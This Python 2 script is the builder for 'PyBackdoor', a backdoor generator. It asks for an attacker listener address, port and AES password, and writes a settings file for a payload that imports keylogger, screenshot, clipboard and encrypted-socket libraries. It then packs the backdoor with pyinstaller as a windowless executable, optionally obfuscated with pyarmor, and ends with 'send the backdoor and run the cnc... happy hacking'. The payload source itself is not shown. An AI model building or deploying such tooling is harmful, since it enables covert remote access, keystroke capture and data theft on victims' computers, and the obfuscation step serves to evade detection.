#!/usr/bin/python
# -*- encoding: utf-8 -*-

import platform
import subprocess

# detect OS type ###############
if "Linux" in platform.uname():
    os_type = "linux"
    subprocess.call("clear", shell=True)
    setting_path = "lib/setting.py"
else:
    os_type = "windows"
    subprocess.call("cls", shell=True)
    setting_path = "lib\\setting.py"

# color codes ###########
red = "\033[1;32;31m"
green = "\033[1;32;32m"
yellow = "\033[1;32;33m"
blue = "\033[1;32;34m"
cyan = "\033[1;32;36m"
black = "\033[1;32;30m"
r = "\x1b[0m"

banner = yellow + """

        ██████╗░██╗░░░██╗██████╗░░█████╗░░█████╗░██╗░░██╗
        ██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
        ██████╔╝░╚████╔╝░██████╦╝███████║██║░░╚═╝█████═╝░
        ██╔═══╝░░░╚██╔╝░░██╔══██╗██╔══██║██║░░██╗██╔═██╗░
        ██║░░░░░░░░██║░░░██████╦╝██║░░██║╚█████╔╝██║░╚██╗
        ╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝


                       Backdoor Generator 
                      ====================

                    Created by: 7h3w4lk3r

                 https://github.com/7h3w4lk3r
                 Email : bl4ckr4z3r@gmail.com\n\n
""" + r


# set configuration options and ask for packing/obfuscating
def generator():
    cleanup()
    try:
        print banner

        print green, "Enter configuration parameters for backdoor :\n", r
        dns = raw_input("\033[1;32;32m[>] Listener IP/DNS (default: 0.0.0.0): \x1b[0m")
        if dns == "":
            dns = "0.0.0.0"
        port = raw_input("\033[1;32;32m[>] Listener port (default: 6000): \x1b[0m")
        if port == "":
            port = 6000
        port = int(port)
        password = raw_input(
            "\033[1;32;32m[>] Password for AES communication encryption (default: 'djknBDS89dHFS(*HFSD())'): \x1b[0m")
        if password == "":
            password = "djknBDS89dHFS(*HFSD())"
        while True:
            print blue, "\n\n[*] Verify your settings [*]\n"
            print "Listener IP/DNS : ", dns
            print "Listener port: ", port
            print "AES encryption password : ", password
            print r
            vrfy = raw_input("\n[*] Is everything correct ? (Y/n): ")
            if vrfy == "y" or vrfy == "Y" or vrfy == "":
                break
            elif vrfy == "n":
                generator()
            else:
                print red, "\n[!] wrong input [!]\n", r
                continue

        setting = """
import socket
import ctypes
import platform
import shutil
from mss import mss
import pyperclip
import os
import sys
import subprocess
import json
import os
from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import base64
import pynput.keyboard
import threading

global ip, port, TMP, APPDATA, path, os_type, access_password, password

# detect OS type ###############
if "Linux" in platform.uname():
	os_type = "linux"
else:
	os_type = "windows"

# set windows temp and appdata directory ######
if os_type == "windows":
	try:
		TMP = os.environ["TEMP"]
		APPDATA = os.environ["APPDATA"]
	except:
		pass
else:
	TMP = "/tmp"

# connection/access settings ##############
dns = """ + "'" + dns + "'" + """
port = """ + str(port) + """
ip = socket.gethostbyname(dns)
# AES channel password ##############
password = """ + "'" + password + "'" + """
"""

        f = open(setting_path, "w")
        f.write(setting)
        f.close()

        choice = raw_input("\033[1;32;33m\n[*] Do you want to pack the backdoor?(Y/n) \x1b[0m")
        if choice == "" or choice == "y" or choice == "Y":
            obfuscation = raw_input(
                "\033[1;32;33m\n[*] Do you want to obfuscate the backdoor using pyarmor? (Y/n) \x1b[0m")
            if obfuscation == "" or obfuscation == "y" or obfuscation == "Y":
                obfuscate()
            else:
                pack()
        else:
            print green, "\n[+] Configuration completed, send the backdoor and run the cnc... happy hacking :) [+]", r
    except Exception, e:
        print red, "\n\n[!] Error occurred while configuring backdoor [!]\n\n", r


# pack using pyinstaller
def pack():
    try:
        print yellow, "\n[*] Packing started, please wait... [*]\n", r
        subprocess.check_output("pyinstaller --noconsole -F backdoor.py", shell=True)
        cleanup()
        print green, "[+] Packing completed successfully, the backdoor executable saved in 'output' directory [+]", r
        print green, "\n[+] Configuration completed, send the backdoor and run the cnc... happy hacking :) [+]", r
    except Exception, e:
        cleanup()
        print red, "\n\n[!] Error occurred while Packing the backdoor [!]\n\n", r
        print e


# obfuscate and pack using pyarmor and pyinstaller
def obfuscate():
    try:
        print cyan, "\ndefault pyarmor options: --obf-mod 2  --obf-code 2 --wrap-mode 1 --advanced 2", r
        options = raw_input("\n\033[1;32;32m[>] Use custom options for pyarmor obfuscation?(N/y)\x1b[0m ")
        if options == "y":
            print cyan, """\n\n
    
pyarmor obfuscation options:

--obf-mod {0,1,2}
--obf-code {0,1,2}
--wrap-mode {0,1}
--advanced {0,1,2,3,4}

example (default options): --obf-mod 2  --obf-code 2 --wrap-mode 1 --advanced 2

            		""", r
            arguments = raw_input(
                "\n\033[1;32;32m[>] enter the space-separated options for pyarmor obfuscation:\x1b[0m   ")
            if arguments == "":
                arguments = " --obf-code 2 --wrap-mode 1 --advanced 2 "
            print yellow, "\n[*] Obfuscation and packing started, please wait... [*]\n", r
            print(subprocess.check_output(
                'pyarmor -q pack -x "' + str(arguments) + '" -e "--onefile --noconsole" backdoor.py', shell=True))
        else:
            print yellow, "\n[*] Obfuscation and packing started, please wait... [*]\n", r
            print(subprocess.check_output('pyarmor -q pack -e "--onefile --noconsole" backdoor.py', shell=True))
        cleanup()
        print green, "[+] Obfuscation and packing completed, the backdoor executable saved in 'output' directory [+]", r
        print green, "\n[+] Configuration completed, send the backdoor and run the cnc... happy hacking :) [+]", r
    except Exception, e:
        cleanup()
        print red, "\n\n[!] Error occurred while obfuscating/packing the backdoor [!]\n\n", r
        print e


# clean up junk files and directories
def cleanup():
    if os_type == "linux":
        subprocess.call("mv dist/backdoor* output/", shell=True)
        subprocess.call("rm -rf build/ dist/ *.spec", shell=True)
    elif os_type == "windows":
        subprocess.call("move dist\\backdoor* output ", shell=True)
        subprocess.call("rmdir /s /Q build dist", shell=True)
        subprocess.call("del /f /Q *.spec", shell=True)


generator()
